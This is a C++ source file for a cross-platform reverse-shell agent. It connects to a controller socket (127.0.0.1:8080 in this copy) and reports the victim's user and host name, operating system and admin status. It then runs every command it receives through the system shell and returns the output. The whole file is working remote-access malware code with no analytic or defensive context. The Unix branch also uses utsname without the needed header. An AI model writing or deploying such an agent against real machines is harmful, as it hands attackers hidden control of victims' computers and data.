#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <vector>
#include <memory>
#include <cstdint>
#include <string>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <lmcons.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef SOCKET sock_t;
    #define CLOSE_SOCKET closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <climits>
    #include <pwd.h>
    #include <unistd.h>
    typedef int sock_t;
    #define CLOSE_SOCKET close
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
#endif

const int PORT = 8080;
const int BUFFER_SIZE = 4096;
const std::string VERSION = "1.0";

bool send_all(sock_t sock, const char* buf, size_t len) {
    while (len > 0) {
        int sent = send(sock, buf, len, 0);
        if (sent <= 0) return false;
        buf += sent;
        len -= sent;
    }
    return true;
}

bool recv_all(sock_t sock, char* buf, size_t len) {
    while (len > 0) {
        int received = recv(sock, buf, len, 0);
        if (received <= 0) return false;
        buf += received;
        len -= received;
    }
    return true;
}

// Helper function to trim whitespace
std::string trim(const std::string& str) {
    size_t first = str.find_first_not_of(" \t");
    if (first == std::string::npos) return "";
    size_t last = str.find_last_not_of(" \t");
    return str.substr(first, (last - first + 1));
}

// Get current working directory
std::string get_current_directory() {
    #ifdef _WIN32
        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);
        return currentDir;
    #else
        char currentDir[PATH_MAX];
        if (getcwd(currentDir, sizeof(currentDir))) {
            return currentDir;
        }
        return "Unknown Directory";
    #endif
}

// Get username and computer name
std::string get_user_pc() {
    std::string result;
    #ifdef _WIN32
        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserNameA(username, &username_len);
        
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD computerName_len = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameA(computerName, &computerName_len);
        
        result = std::string(username) + "@" + computerName;
    #else
        char username[256];
        if (getlogin_r(username, sizeof(username)) == 0) {
            char hostname[256];
            if (gethostname(hostname, sizeof(hostname)) == 0) {
                result = std::string(username) + "@" + hostname;
            }
        }
        if (result.empty()) {
            result = "unknown@unknown";
        }
    #endif
    return result;
}

// Get user status (active/idle)
std::string get_user_status() {
    // Simplified - always return active
    return "Active";
}

// Get operating system info
std::string get_os_info() {
    #ifdef _WIN32
        return "Windows";
    #else
        struct utsname uts;
        uname(&uts);
        return std::string(uts.sysname) + " " + uts.release;
    #endif
}

// Get account type (admin/user)
std::string get_account_type() {
    #ifdef _WIN32
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DWORD elevation;
            DWORD cbSize = sizeof(DWORD);
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
                CloseHandle(hToken);
                return elevation ? "Admin" : "User";
            }
            CloseHandle(hToken);
        }
        return "Unknown";
    #else
        if (geteuid() == 0) {
            return "Admin";
        }
        return "User";
    #endif
}

std::string execute_command(const std::string& cmd) {
    if (cmd == "disconnect") {
        return "DISCONNECT";
    }

    // Handle "cd" command separately
    if (cmd.substr(0, 2) == "cd") {
        std::string path;
        if (cmd.length() > 3) {
            path = trim(cmd.substr(3));
        }
        
        #ifdef _WIN32
            if (path.empty()) {
                const char* home = std::getenv("USERPROFILE");
                if (home) path = home;
                else return "Error: Could not find home directory";
            }
            
            if (!SetCurrentDirectoryA(path.c_str())) {
                return "Error: Failed to change directory to " + path;
            }
        #else
            if (path.empty()) {
                const char* home = std::getenv("HOME");
                if (home) path = home;
                else return "Error: Could not find home directory";
            }
            
            if (chdir(path.c_str()) != 0) {
                return "Error: Failed to change directory to " + path;
            }
        #endif
        return "";  // Success, output will be empty
    }

    // Execute regular commands
    #ifdef _WIN32
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(
            _popen(cmd.c_str(), "r"), _pclose);
        if (!pipe) return "Command execution failed";
    #else
        std::unique_ptr<FILE, decltype(&pclose)> pipe(
            popen(cmd.c_str(), "r"), pclose);
        if (!pipe) return "Command execution failed";
    #endif

    std::string result;
    char buffer[BUFFER_SIZE];
    while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
        result += buffer;
    }
    return result;
}

int main() {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            return 1;
        }
    #endif

    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sock, (sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "Connection failed\n";
        CLOSE_SOCKET(sock);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    // Send initial current directory
    std::string current_dir = get_current_directory();
    uint32_t dir_len = htonl(static_cast<uint32_t>(current_dir.size()));
    if (!send_all(sock, reinterpret_cast<const char*>(&dir_len), sizeof(dir_len))) {
        CLOSE_SOCKET(sock);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }
    if (!send_all(sock, current_dir.c_str(), current_dir.size())) {
        CLOSE_SOCKET(sock);
        #ifdef _WIN32
            WSACleanup();
        #endif
        return 1;
    }

    // Send session info
    std::string tag = "Default";  // Could be configurable
    std::string user_pc = get_user_pc();
    std::string user_status = get_user_status();
    std::string os = get_os_info();
    std::string account_type = get_account_type();

    // Send tag
    uint32_t field_len = htonl(static_cast<uint32_t>(tag.size()));
    send_all(sock, reinterpret_cast<const char*>(&field_len), sizeof(field_len));
    send_all(sock, tag.c_str(), tag.size());
    
    // Send user_pc
    field_len = htonl(static_cast<uint32_t>(user_pc.size()));
    send_all(sock, reinterpret_cast<const char*>(&field_len), sizeof(field_len));
    send_all(sock, user_pc.c_str(), user_pc.size());
    
    // Send user_status
    field_len = htonl(static_cast<uint32_t>(user_status.size()));
    send_all(sock, reinterpret_cast<const char*>(&field_len), sizeof(field_len));
    send_all(sock, user_status.c_str(), user_status.size());
    
    // Send os
    field_len = htonl(static_cast<uint32_t>(os.size()));
    send_all(sock, reinterpret_cast<const char*>(&field_len), sizeof(field_len));
    send_all(sock, os.c_str(), os.size());
    
    // Send account_type
    field_len = htonl(static_cast<uint32_t>(account_type.size()));
    send_all(sock, reinterpret_cast<const char*>(&field_len), sizeof(field_len));
    send_all(sock, account_type.c_str(), account_type.size());

    while (true) {
        // Receive command length
        uint32_t cmd_len;
        if (!recv_all(sock, reinterpret_cast<char*>(&cmd_len), sizeof(cmd_len))) 
            break;
        cmd_len = ntohl(cmd_len);

        // Receive command
        std::vector<char> cmd_buf(cmd_len + 1, 0);
        if (!recv_all(sock, cmd_buf.data(), cmd_len))
            break;
        std::string command(cmd_buf.data(), cmd_len);

        if (command == "disconnect") {
            break;
        }

        // Execute command
        std::string output = execute_command(command);
        
        if (output == "DISCONNECT") {
            break;
        }
        
        // Update current directory after command execution
        current_dir = get_current_directory();
        uint32_t dir_len = htonl(static_cast<uint32_t>(current_dir.size()));
        
        // Send updated directory
        if (!send_all(sock, reinterpret_cast<const char*>(&dir_len), sizeof(dir_len))) 
            break;
        if (!send_all(sock, current_dir.c_str(), current_dir.size())) 
            break;

        // Send output length
        uint32_t output_len = htonl(static_cast<uint32_t>(output.size()));
        if (!send_all(sock, reinterpret_cast<const char*>(&output_len), sizeof(output_len))) 
            break;

        // Send output
        if (!output.empty()) {
            if (!send_all(sock, output.c_str(), output.size())) 
                break;
        }
    }

    CLOSE_SOCKET(sock);
    
    #ifdef _WIN32
        WSACleanup();
    #endif

    return 0;
}